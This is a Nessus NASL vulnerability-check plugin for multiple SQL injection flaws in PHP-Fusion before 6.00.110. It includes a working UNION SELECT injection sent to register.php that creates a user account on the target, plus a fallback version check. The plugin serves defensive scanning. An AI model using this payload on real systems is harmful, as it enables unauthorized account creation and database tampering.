#
# Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

  desc["english"] = "
Synopsis :

The remote host contains several PHP scripts that are vulnerable to 
SQL injection flaws.

Description : 

The remote version of this software is vulnerable to multiple SQL
injection attacks due to its failure to properly sanitize certain
parameters.  Provided PHP's 'magic_quotes_gpc' setting is disabled,
these flaws allow an attacker to manipulate database queries, which
may result in the disclosure or modification of data. 

See also : 

http://securityfocus.org/archive/1/411909
http://archives.neohapsis.com/archives/secunia/2005-q4/0021.html
http://www.gnucitizen.org/writings/php-fusion-messages.php-sql-injection-vulnerability.xhtml
http://secunia.com/secunia_research/2005-52/advisory

Solution : 

Update to at least version 6.00.110 of PHP-Fusion.

Risk factor :

Low / CVSS Base Score : 3 
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:C)";


if (description) {
  script_id(20009);
  script_version("$Revision: 1.2 $");
  script_cve_id("CVE-2005-3157", "CVE-2005-3158", "CVE-2005-3160", "CVE-2005-3161");
  script_bugtraq_id(14964, 14992, 15005, 15018);
  if (defined_func("script_xref")) 
  {
   script_xref(name:"OSVDB", value:"19718");
   script_xref(name:"OSVDB", value:"19722");
   script_xref(name:"OSVDB", value:"19841");
   script_xref(name:"OSVDB", value:"19866");
   script_xref(name:"OSVDB", value:"19867");
  }

  name["english"] = "PHP-Fusion < 6.00.110 Multiple SQL Injection Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for SQL injection in PHP-Fusion's register.php";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"(C) 2005 Josh Zlatin-Amishav");

  script_dependencies("php_fusion_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/php-fusion"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  if (!safe_checks()) {
    # Make sure 'register.php' exists -- it's used in the exploit.
    req = http_get(item:string(dir, "/register.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If it does...
    if ("<form name='inputform' method='post' action='register.php'" >< res) {
      # Try to exploit the flaw to register a user.
      user = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_");
      pass = rand_str();
      email = string(user, "@", get_host_name());
      sploit = string(
        "UNION SELECT ",
          '"",',
          '"",',
          '0,',
          "'a:4:{", 
            's:9:"user_name";s:', strlen(user), ':"', user, '";',
            's:13:"user_password";s:', strlen(pass), ':"', pass, '";',
            's:10:"user_email";s:', strlen(email), ':"', email, '";',
            's:15:"user_hide_email";s:1:"1";',
          "}"
      );
      #
      # nb: the code sanitizes GETs so we can't use that.
      postdata = string("activate=", rand_str(), "'+", urlencode(str:sploit));
      req = string(
        "POST ", dir, "/register.php?plugin=", SCRIPT_NAME, " HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      if ( "Your account has been verified." >< res) 
      {
        if (report_verbosity > 0) {
          report = string(
            desc["english"],
            "\n",
            "\n",
            "Plugin output :\n",
            "\n",
            "Nessus has successfully exploited one of the flaws by adding\n",
            "the user '", user, "' to PHP-Fusion on the remote host.\n"
          );
        }
        else report = desc["english"];

        security_note(port:port, data:report);
        exit(0);
      }
    }
  }

  # Check the version number in case registrations are disabled or safe checks are enabled.
  if (ver =~ "^([0-5][.,]|6[.,]00[.,](0|10[0-9]))") {
    report = str_replace(
      string:desc["english"],
      find:"See also :",
      replace:string(
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of PHP-Fusion\n",
        "***** installed there.\n",
        "\n",
        "See also :"
      )
    );
    security_note(port:port, data:report);
  }
}
